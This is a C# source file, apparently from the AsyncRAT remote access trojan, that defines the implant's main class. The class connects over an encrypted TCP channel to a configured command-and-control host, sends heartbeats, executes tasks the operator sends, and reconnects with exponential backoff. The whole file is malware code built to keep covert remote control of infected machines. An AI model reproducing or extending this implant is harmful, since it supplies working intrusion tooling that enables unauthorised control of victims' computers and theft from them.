using AsyncRat.Client.Network;
using AsyncRat.Client.Config;

namespace AsyncRat.Client.Implant;

public sealed class ImplantMain : IAsyncDisposable
{
    private readonly ImplantConfig _cfg;
    private readonly TcpChannel _channel;
    private readonly Heartbeat _heartbeat;
    private readonly TaskExecutor _executor;
    private CancellationTokenSource _cts = new();
    private int _reconnects;

    public bool IsConnected => _channel.IsConnected;
    public int ReconnectCount => _reconnects;

    public ImplantMain(ImplantConfig cfg)
    {
        _cfg = cfg;
        var crypto = new CryptoLayer(Convert.FromHexString(cfg.EncryptionKeyHex));
        _channel = new TcpChannel(new PacketFramer(), crypto);
        _heartbeat = new Heartbeat(_channel, TimeSpan.FromMilliseconds(cfg.HeartbeatIntervalMs));
        _executor = new TaskExecutor(_channel);
    }

    public async Task RunAsync(CancellationToken ct = default)
    {
        _cts = CancellationTokenSource.CreateLinkedTokenSource(ct);

        while (!_cts.IsCancellationRequested)
        {
            try
            {
                await _channel.ConnectAsync(_cfg.Host, _cfg.Port, _cts.Token);
                _reconnects = 0;

                var beatTask = _heartbeat.RunAsync(_cts.Token);
                var execTask = _executor.RunAsync(_cts.Token);
                await Task.WhenAny(beatTask, execTask);
            }
            catch (OperationCanceledException) when (ct.IsCancellationRequested)
            {
                break;
            }
            catch (Exception)
            {
                _reconnects++;
                var delay = Math.Min(60_000, _cfg.ReconnectDelayMs * (int)Math.Pow(2, Math.Min(_reconnects, 6)));
                await Task.Delay(delay, _cts.Token);
            }
            finally
            {
                await _channel.DisconnectAsync();
            }
        }
    }

    public async Task StopAsync()
    {
        await _cts.CancelAsync();
        await _channel.DisconnectAsync();
    }

    public async ValueTask DisposeAsync()
    {
        await StopAsync();
        await _channel.DisposeAsync();
        _cts.Dispose();
    }
}
